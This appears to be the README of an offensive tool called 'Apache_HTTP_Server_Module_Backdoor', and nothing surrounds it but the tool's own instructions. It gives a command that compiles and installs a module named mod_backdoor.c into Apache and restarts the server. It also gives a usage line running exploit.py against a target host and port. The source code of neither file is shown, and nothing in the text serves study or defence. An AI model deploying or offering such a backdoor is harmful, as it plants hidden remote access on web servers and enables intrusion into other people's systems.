Apache_HTTP_Server_Module_Backdoor
---

Installation:
```
apxs -i -a -c mod_backdoor.c && service apache2 restart
```

Usage:
```
python exploit.py [HOST] [PORT]
```
